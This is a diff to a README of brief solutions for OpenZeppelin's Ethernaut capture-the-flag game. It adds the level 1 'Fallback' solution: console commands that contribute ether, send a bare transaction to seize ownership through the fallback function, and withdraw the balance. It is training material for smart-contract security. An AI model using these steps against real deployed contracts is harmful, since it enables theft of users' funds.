@@ -76,4 +76,25 @@ Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
 > await contract.authenticate("ethernaut0")
 ```
 
-Submit the instance and the zeroth level is completed.
+
+
+
+## <a name='Fallback'></a> 1. Fallback
+> You will beat this level if:
+> 1. You claim ownership of the contract
+> 2. You reduce its balance to 0
+
+```js
+// First, we contribute some ether:
+await contract.contribute({value: 5})
+
+// Then we send some ether to make us the owner
+sendTransaction({from: player, to: instance, value: 5})
+
+// Verify we have claimed ownership
+await contract.owner()
+
+// Reduce balance to 0
+await contract.withdraw()
+
+```
